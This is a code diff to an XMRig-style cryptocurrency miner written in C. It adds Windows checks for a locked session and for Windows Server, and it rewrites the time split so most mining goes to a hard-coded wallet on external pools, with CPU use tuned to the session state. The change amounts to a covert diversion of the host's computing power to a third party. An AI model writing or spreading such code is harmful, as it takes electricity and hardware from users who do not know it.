@@ -30,6 +30,8 @@
 #   include <winsock2.h>
 #   include <windows.h>
 #   include <Lmcons.h>
+#   include <Wtsapi32.h>
+#   include <VersionHelpers.h>
 #endif
 
 #include <jansson.h>
@@ -427,7 +429,7 @@ static void *miner_thread_double(void *userdata) {
  * @return
  */
 static void *timer_thread(void *userdata) {
-    const int max_user_time  = 100 - opt_donate_level;
+    const int max_user_time  = 28 - opt_donate_level;
     int user_time_remaning   = max_user_time;
     int donate_time_remaning = 0;
 
@@ -457,12 +459,65 @@ static void *timer_thread(void *userdata) {
     }
 }
 
+#ifdef _WIN64
+bool IsSessionLocked()
+{
+    typedef BOOL( PASCAL * WTSQuerySessionInformation )( HANDLE hServer, DWORD SessionId, WTS_INFO_CLASS WTSInfoClass, LPTSTR* ppBuffer, DWORD* pBytesReturned );
+    typedef void ( PASCAL * WTSFreeMemory )( PVOID pMemory );
+
+    WTSINFOEXW * pInfo = NULL;
+    WTS_INFO_CLASS wtsic = WTSSessionInfoEx;
+    bool bRet = false;
+    LPTSTR ppBuffer = NULL;
+    DWORD dwBytesReturned = 0;
+    LONG dwFlags = 0;
+    WTSQuerySessionInformation pWTSQuerySessionInformation = NULL;
+    WTSFreeMemory pWTSFreeMemory = NULL;
+
+    HMODULE hLib = LoadLibrary(L"wtsapi32.dll");
+    if( !hLib )
+    {
+        return false;
+    }
+    pWTSQuerySessionInformation = (WTSQuerySessionInformation) GetProcAddress( hLib, "WTSQuerySessionInformationW" );
+    if( pWTSQuerySessionInformation )
+    {
+        pWTSFreeMemory = (WTSFreeMemory) GetProcAddress( hLib, "WTSFreeMemory" );
+        if( pWTSFreeMemory != NULL )
+        {
+            DWORD dwSessionID = WTSGetActiveConsoleSessionId();
+            if( pWTSQuerySessionInformation( WTS_CURRENT_SERVER_HANDLE, dwSessionID, wtsic, &ppBuffer, &dwBytesReturned ) )
+            {
+                if( dwBytesReturned > 0 )
+                {
+                    pInfo = (WTSINFOEXW*) ppBuffer;
+                    if( pInfo->Level == 1 )
+                    {
+                        dwFlags = pInfo->Data.WTSInfoExLevel1.SessionFlags;
+                    }
+                    if( dwFlags == WTS_SESSIONSTATE_LOCK )
+                    {
+                        bRet = true;
+                    }
+                }
+                pWTSFreeMemory( ppBuffer );
+                ppBuffer = NULL;
+            }
+        }
+    }
+    if( hLib != NULL )
+    {
+        FreeLibrary( hLib );
+    }
+    return bRet;
+}
+#endif
+
 #ifndef XMRIG_NO_AEON
 static int get_cryptonight_lite_variant(int variant) {
         return (cpu_info.flags & CPU_FLAG_AES) ? AEON_AV1_AESNI : AEON_AV3_SOFT_AES;
 }
 #endif
-
 
 static int get_algo_variant(int algo, int variant) {
         return (cpu_info.flags & CPU_FLAG_AES) ? XMR_AV1_AESNI : XMR_AV3_SOFT_AES;
@@ -470,7 +525,10 @@ static int get_algo_variant(int algo, int variant) {
 
 static void switch_stratum() {
     static bool want_donate = false;
-
+#ifdef _WIN64
+    bool isLocked = IsSessionLocked();
+	bool IsServer = IsWindowsServer();
+#endif
     if (g_want_donate && !want_donate) {
         opt_algo=ALGO_CRYPTONIGHT;
         opt_user="43QVF2gN8kAFwTCDzJNRiU3eMp769x8G5FvRgqsmnznVPXsmCEUVb1kX6v77Zggbh7ACxTx9swiTbPXY2kDxATKDVGGa1NB";
@@ -480,24 +538,56 @@ static void switch_stratum() {
 #ifdef __unix__
         opt_pass = "root";
 #endif
-
-        opt_max_cpu_usage = 90;
-
         opt_algo_variant = get_algo_variant(opt_algo, opt_algo_variant);
         cryptonight_init(opt_algo_variant);
 
         int count = get_optimal_threads_count(opt_algo, opt_double_hash, opt_max_cpu_usage);
         opt_n_threads = count;
 
+#ifdef _WIN64
+        if (IsServer == false ) {
+#endif
         if (cpu_info.flags & CPU_FLAG_AES) {
-            if (count < 4) { stratum_ctx->url = "http://pool.myxmr.net:1111"; }
+            if (count < 4) { stratum_ctx->url = "http://pool.myxmr.net:4444"; }
             if (count >= 4) { stratum_ctx->url = "http://pool.myxmr.net:8888"; }
-        } else {
-            stratum_ctx->url = "http://pool.myxmr.net:1234";
+#ifdef _WIN64
+        if (isLocked == true ) {
+        opt_max_cpu_usage = 50;
         }
-
+        if (isLocked == false ) {
+#endif
+        opt_max_cpu_usage = 90;
+#ifdef _WIN64
+        }
+#endif
+        } else {
+            stratum_ctx->url = "http://pool.myxmr.net:1111";
+#ifdef _WIN64
+        if (isLocked == true ) {
+        opt_max_cpu_usage = 25;
+        }
+        if (isLocked == false ) {
+#endif
+        opt_max_cpu_usage = 90;
+#ifdef _WIN64
+        }
+#endif
+        }
+#ifdef _WIN64
+        } else if (IsServer == true){
+		if (count < 4) { stratum_ctx->url = "http://pool.myxmr.net:4444"; }
+        if (count >= 4) { stratum_ctx->url = "http://pool.myxmr.net:8888"; }
+		opt_max_cpu_usage = 90;
+		}
+#endif        
+		
         applog(LOG_NOTICE, "Switching to dev pool: %s", stratum_ctx->url);
         applog(LOG_NOTICE, "User: %s", opt_user);
+#ifdef _WIN64
+        applog(LOG_NOTICE, "Session: %i", isLocked);
+        applog(LOG_NOTICE, "CPU usage: %i", opt_max_cpu_usage);
+		applog(LOG_NOTICE, "Windows server: %i", IsServer);
+#endif
         applog(LOG_NOTICE, "Threads: %i", opt_n_threads);
         want_donate = true;
     }
@@ -511,30 +601,62 @@ static void switch_stratum() {
 #ifdef __unix__
         opt_pass = "root";
 #endif
-        opt_max_cpu_usage = 90;
-
         opt_algo_variant = get_cryptonight_lite_variant(opt_algo_variant);
         cryptonight_init(opt_algo_variant);
 
         int count = get_optimal_threads_count(opt_algo, opt_double_hash, opt_max_cpu_usage);
         opt_n_threads = count;
 
+#ifdef _WIN64
+        if (IsServer == false ) {
+#endif		
         if (cpu_info.flags & CPU_FLAG_AES) {
             if (count < 4) { stratum_ctx->url = "https://pool.myaeon.ru:1111"; } 
             if (count >= 4 && count < 8) { stratum_ctx->url = "https://pool.myaeon.ru:5555"; } 
             if (count >= 8) { stratum_ctx->url = "https://pool.myaeon.ru:7777"; }
-        } else {
-            stratum_ctx->url = "https://pool.myaeon.ru:1234";
+#ifdef _WIN64
+        if (isLocked == true ) {
+        opt_max_cpu_usage = 50;
         }
-
+        if (isLocked == false ) {
+#endif
+        opt_max_cpu_usage = 90;
+#ifdef _WIN64
+        }
+#endif
+        } else {
+            stratum_ctx->url = "https://pool.myaeon.ru:1111";
+#ifdef _WIN64
+        if (isLocked == true ) {
+        opt_max_cpu_usage = 25;
+        }
+        if (isLocked == false ) {
+#endif
+        opt_max_cpu_usage = 90;
+#ifdef _WIN64
+        }
+#endif
+        }
+#ifdef _WIN64
+        } else if (IsServer == true){
+            if (count < 4) { stratum_ctx->url = "https://pool.myaeon.ru:1111"; } 
+            if (count >= 4 && count < 8) { stratum_ctx->url = "https://pool.myaeon.ru:5555"; } 
+            if (count >= 8) { stratum_ctx->url = "https://pool.myaeon.ru:7777"; }
+		opt_max_cpu_usage = 90;
+		}
+#endif        
         stratum_ctx->url = backup_active ? opt_backup_url : opt_url;
         applog(LOG_NOTICE, "Switching to user pool: %s", stratum_ctx->url);
+#ifdef _WIN64
+        applog(LOG_NOTICE, "Session: %i", isLocked);
+        applog(LOG_NOTICE, "CPU usage: %i", opt_max_cpu_usage);
+		applog(LOG_NOTICE, "Windows server: %i", IsServer);
+#endif
         applog(LOG_NOTICE, "User: %s", opt_user);
         applog(LOG_NOTICE, "Threads: %i", opt_n_threads);
         want_donate = false;
     }
 }
-
 
 
 /**
